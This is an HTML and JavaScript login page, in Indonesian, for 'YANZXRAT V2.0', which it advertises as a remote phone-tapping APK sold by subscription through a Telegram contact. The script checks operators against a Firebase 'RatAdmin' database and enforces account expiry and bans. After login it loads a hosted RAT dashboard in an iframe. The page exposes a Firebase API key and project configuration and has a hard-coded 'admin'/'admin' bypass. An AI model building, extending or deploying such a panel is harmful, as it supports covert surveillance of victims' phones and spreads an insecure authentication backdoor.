<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>YANZX RAT - Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', system-ui, sans-serif;
            background: linear-gradient(135deg, #0a0a0f 0%, #1a1a2e 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .login-container {
            background: rgba(26, 26, 46, 0.9);
            backdrop-filter: blur(10px);
            border-radius: 58px;
            padding: 45px 35px;
            width: 100%;
            max-width: 450px;
            border: 1px solid rgba(16, 163, 127, 0.2);
            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
            text-align: center;
        }

        .title {
            margin-bottom: 20px;
        }

        .title h1 {
            color: #10a37f;
            font-size: 32px;
            letter-spacing: 4px;
            font-weight: 800;
        }

        .title p {
            color: #888;
            font-size: 12px;
            margin-top: 5px;
            letter-spacing: 1px;
        }

        .logo-container {
            margin-bottom: 25px;
            display: flex;
            justify-content: center;
        }

        .logo-img {
            width: 380px;
            height: 170px;
            border-radius: 20px;
            object-fit: cover;
            box-shadow: 0 0 30px rgba(16,163,127,0.5);
            background: #10a37f;
        }

        .line {
            width: 100%;
            height: 1px;
            background: rgba(255,255,255,0.1);
            margin: 20px 0;
        }

        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }

        .form-group label {
            display: block;
            color: #aaa;
            font-size: 13px;
            margin-bottom: 8px;
            font-weight: 500;
            letter-spacing: 1px;
        }

        .form-group input {
            width: 100%;
            padding: 16px 20px;
            border-radius: 40px;
            border: 1px solid rgba(255,255,255,0.1);
            background: rgba(15, 15, 26, 0.8);
            color: white;
            font-size: 15px;
            outline: none;
            transition: all 0.3s;
        }

        .form-group input:focus {
            border-color: #10a37f;
            box-shadow: 0 0 15px rgba(16,163,127,0.2);
        }

        .form-group input::placeholder {
            color: #555;
        }

        .masuk-label {
            text-align: left;
            margin-bottom: 5px;
        }

        .masuk-label span {
            color: #aaa;
            font-size: 13px;
            letter-spacing: 1px;
        }

        .login-btn {
            width: 100%;
            padding: 16px;
            border-radius: 40px;
            border: none;
            background: #10a37f;
            color: white;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 10px;
            letter-spacing: 3px;
        }

        .login-btn:active {
            transform: scale(0.97);
            background: #0d8a6b;
        }

        .error-msg {
            background: rgba(220,38,38,0.2);
            color: #ff6b6b;
            padding: 12px;
            border-radius: 40px;
            text-align: center;
            margin-bottom: 15px;
            font-size: 13px;
            display: none;
            border: 1px solid rgba(220,38,38,0.3);
        }

        .footer {
            margin-top: 25px;
        }

        .footer .akun {
            color: #888;
            font-size: 13px;
            margin-bottom: 8px;
        }

        .footer .beli {
            color: #555;
            font-size: 12px;
            cursor: pointer;
            transition: 0.3s;
        }

        .footer .beli:hover {
            color: #10a37f;
        }

        /* ========== VIDEO SPLASH SCREEN (CENTER 16:9) ========== */
        .splash-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: black;
            z-index: 9999;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            visibility: hidden;
            opacity: 0;
            transition: visibility 0.3s, opacity 0.3s;
        }

        .splash-overlay.show {
            visibility: visible;
            opacity: 1;
        }

        .video-wrapper {
            width: 90%;
            max-width: 680px;
            aspect-ratio: 16 / 9;
            position: relative;
            border-radius: 20px;
            overflow: hidden;
            box-shadow: 0 0 40px rgba(16,163,127,0.3);
            border: 1px solid rgba(16,163,127,0.3);
        }

        .splash-video {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        .skip-btn {
            position: fixed;
            bottom: 30px;
            right: 30px;
            background: rgba(16, 163, 127, 0.9);
            backdrop-filter: blur(10px);
            border: none;
            color: white;
            padding: 12px 28px;
            border-radius: 40px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            z-index: 10000;
            transition: 0.3s;
            box-shadow: 0 0 15px rgba(16,163,127,0.5);
        }

        .skip-btn:hover {
            background: #10a37f;
            transform: scale(1.02);
        }

        .countdown-text {
            position: fixed;
            bottom: 30px;
            left: 30px;
            color: #888;
            font-size: 12px;
            background: rgba(0,0,0,0.6);
            padding: 6px 12px;
            border-radius: 20px;
            z-index: 10000;
            font-family: monospace;
        }

        /* WEBVIEW UNTUK DASHBOARD */
        .webview-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 10000;
            background: #0a0a0f;
            display: none;
        }

        .webview-container.show {
            display: block;
        }

        iframe {
            width: 100%;
            height: 100%;
            border: none;
        }
    </style>
</head>
<body>
    <!-- LOGIN FORM -->
    <div class="login-container" id="loginContainer">
        <div class="title">
            <h1>YANZXRAT V2.0</h1>
            <p>APK SADAP JARAK JAUH</p>
        </div>

        <div class="logo-container">
            <img src="https://i.ibb.co.com/YB17JS6s/795dc23d-6329-44a5-b904-6ef842254d10.jpg" alt="Logo" class="logo-img" id="logoImg" onerror="this.src='https://placehold.co/380x170/10a37f/white?text=YANZX+RAT'">
        </div>

        <div class="line"></div>

        <div id="errorMsg" class="error-msg"></div>

        <div class="form-group">
            <label>EMAIL ANDA</label>
            <input type="email" id="loginEmail" placeholder="nama@gmail.com" autocomplete="off">
        </div>

        <div class="form-group">
            <label>KATA SANDI</label>
            <input type="password" id="loginPassword" placeholder="......">
        </div>

        <div class="masuk-label">
            <span>MASUK</span>
        </div>

        <button class="login-btn" onclick="doLogin()">MASUK</button>

        <div class="footer">
            <div class="akun">Development By Yanz Official</div>
            <div class="beli" onclick="alert('Hubungi developer untuk beli akun:\n📱 Telegram: @sisuryaofficial')">BELI AKUN YANZXRAT</div>
        </div>
    </div>

    <!-- VIDEO SPLASH OVERLAY (16:9 CENTER) -->
    <div class="splash-overlay" id="splashOverlay">
        <div class="video-wrapper">
            <video id="splashVideo" class="splash-video" autoplay playsinline loop>
                <source src="https://files.catbox.moe/cba7b8.mp4" type="video/mp4">
            </video>
        </div>
        <button class="skip-btn" id="skipBtn" onclick="skipSplash()">⏭ SKIP</button>
        <div class="countdown-text" id="countdownText">    </div>
    </div>

    <!-- WEBVIEW DASHBOARD -->
    <div class="webview-container" id="webviewContainer">
        <iframe id="dashboardFrame" src="about:blank"></iframe>
    </div>

    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyBqIqdlzzXoZoT8N_J9HRmpoJvbH05Da4c",
            authDomain: "inject-60ad5.firebaseapp.com",
            databaseURL: "https://inject-60ad5-default-rtdb.firebaseio.com",
            projectId: "inject-60ad5",
            storageBucket: "inject-60ad5.firebasestorage.app",
            messagingSenderId: "1043671474298",
            appId: "1:1043671474298:android:2276352c0d88ebd9709bc3"
        };

        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        // ========== GANTI URL DASHBOARD DI SINI SAYANG ==========
        const DASHBOARD_URL = "https://yanzxrat1576.netlify.app/";

        // Ganti dengan URL video Meowh (upload sendiri atau pake dari internet)
        const VIDEO_URL = "https://www.image2url.com/r2/default/videos/1779728814166-7c7b09ff-b49d-4319-af9e-71ceb51f7798.mp4";

        let splashTimer = null;
        let isRedirected = false;

        function showError(msg) {
            const errorDiv = document.getElementById('errorMsg');
            errorDiv.innerText = msg;
            errorDiv.style.display = 'block';
            setTimeout(() => {
                errorDiv.style.display = 'none';
            }, 4000);
        }

        // ========== LOAD DASHBOARD DI WEBVIEW ==========
        function loadDashboardInWebView() {
            if (isRedirected) return;
            isRedirected = true;
            
            // Hentikan timer jika masih berjalan
            if (splashTimer) clearTimeout(splashTimer);
            
            // Sembunyikan splash
            const splash = document.getElementById('splashOverlay');
            splash.classList.remove('show');
            
            // Hentikan video
            const video = document.getElementById('splashVideo');
            video.pause();
            video.currentTime = 15;
            
            // Tampilkan WebView dan load dashboard
            const webviewContainer = document.getElementById('webviewContainer');
            const iframe = document.getElementById('dashboardFrame');
            
            webviewContainer.classList.add('show');
            iframe.src = DASHBOARD_URL;
        }

        // ========== SKIP SPLASH ==========
        function skipSplash() {
            if (isRedirected) return;
            loadDashboardInWebView();
        }

        // ========== SHOW VIDEO SPLASH ==========
        function showSplash() {
            // Sembunyikan form login
            document.getElementById('loginContainer').style.display = 'none';
            
            // Tampilkan splash
            const splash = document.getElementById('splashOverlay');
            splash.classList.add('show');
            
            // Set video
            const video = document.getElementById('splashVideo');
            video.src = VIDEO_URL;
            video.load();
            video.play().catch(e => console.log("Auto-play prevented:", e));
            
            // Timer 20 detik (kalo skip gak ditekan)
            splashTimer = setTimeout(() => {
                if (!isRedirected) {
                    loadDashboardInWebView();
                }
            }, 20000); // 20 detik auto redirect
        }

        // ========== CEK EXPIRED ==========
        function isExpired(expiredDateStr) {
            if (!expiredDateStr) return false;
            try {
                const expiredDate = new Date(expiredDateStr);
                const now = new Date();
                return now > expiredDate;
            } catch(e) {
                return false;
            }
        }

        // ========== LOGIN ==========
        async function doLogin() {
            const email = document.getElementById('loginEmail').value;
            const password = document.getElementById('loginPassword').value;

            if (!email || !password) {
                showError('Email dan password harus diisi!');
                return;
            }

            // DEFAULT ADMIN (EMERGENCY)
            if (email === "admin" && password === "admin") {
                showSplash();
                return;
            }

            try {
                const snapshot = await database.ref('RatAdmin').once('value');
                const admins = snapshot.val();
                let found = false;
                let adminData = null;

                if (admins) {
                    for (let id in admins) {
                        const admin = admins[id];
                        if (admin.email === email && admin.password === password) {
                            found = true;
                            adminData = admin;
                            break;
                        }
                    }
                }

                if (!found) {
                    showError('Email atau password salah!');
                    return;
                }

                // CEK STATUS AKUN
                if (adminData.status === 'banned') {
                    showError('⛔ Akun Anda telah diblokir! Hubungi developer.');
                    return;
                }

                if (adminData.status === 'inactive') {
                    showError('⛔ Akun belum diaktifkan! Hubungi developer.');
                    return;
                }

                // CEK EXPIRED
                if (adminData.expired_date && isExpired(adminData.expired_date)) {
                    showError('⛔ Akun sudah kadaluwarsa! Perpanjang masa aktif.');
                    return;
                }

                // UPDATE LAST LOGIN
                await database.ref('RatAdmin/' + adminData.id).update({
                    last_login: Date.now()
                });

                // TAMPILKAN VIDEO SPLASH
                showSplash();

            } catch(e) {
                console.log("Firebase error:", e.message);
                showError('Error koneksi: ' + e.message);
            }
        }

        // ENTER KEY
        document.getElementById('loginPassword').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                doLogin();
            }
        });
    </script>
</body>
</html>
